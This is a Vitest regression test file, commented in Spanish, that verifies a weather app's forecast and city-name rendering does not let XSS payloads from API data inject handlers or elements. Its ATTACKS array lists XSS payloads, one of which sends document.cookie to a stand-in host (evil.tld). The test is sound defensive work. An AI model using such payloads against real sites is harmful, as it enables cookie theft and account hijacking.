// Verificación end-to-end del XSS a través del código real de producción.
import { describe, it, expect, beforeEach } from 'vitest';
import { renderForecast, renderWeatherCard } from '../js/ui.js';
import { mountAppDom, forecastPayload, weatherPayload } from './helpers/fixtures.js';

const ATTACKS = [
    'x" onerror="fetch("//evil.tld/?c="+document.cookie)',
    '"><img src=x onerror=alert(1)>',
    "' onerror='alert(1)",
    'x" onload="alert(1)" data-x="',
];

beforeEach(() => mountAppDom());

describe('regresión XSS — payload de OWM malicioso', () => {
    it.each(ATTACKS)('ningún manejador inyectado desde el icono: %s', (payload) => {
        renderForecast(forecastPayload([
            { dt: 1700000000, main: { temp: 20 }, weather: [{ description: 'x', icon: payload }] },
        ]));
        const img = document.querySelector('.forecast-item img');
        for (const attr of ['onerror', 'onload', 'onclick']) {
            expect(img.hasAttribute(attr), `se inyectó ${attr}`).toBe(false);
        }
    });

    it.each(ATTACKS)('ningún elemento extra inyectado desde la descripción: %s', (payload) => {
        renderForecast(forecastPayload([
            { dt: 1700000000, main: { temp: 20 }, weather: [{ description: payload, icon: '01d' }] },
        ]));
        // solo la img legítima del icono, sin img/script inyectados
        expect(document.querySelectorAll('.forecast-item img')).toHaveLength(1);
        expect(document.querySelector('.forecast-item script')).toBeNull();
        document.querySelectorAll('.forecast-item *').forEach(el => {
            for (const attr of ['onerror', 'onload', 'onclick']) {
                expect(el.hasAttribute(attr), `${el.tagName}[${attr}]`).toBe(false);
            }
        });
    });

    it.each(ATTACKS)('renderWeatherCard no inyecta nodos: %s', (payload) => {
        renderWeatherCard(weatherPayload({ name: payload }));
        const el = document.getElementById('cityName');
        expect(el.children).toHaveLength(0);
        expect(el.textContent).toBe(payload); // visible como texto literal
    });
});
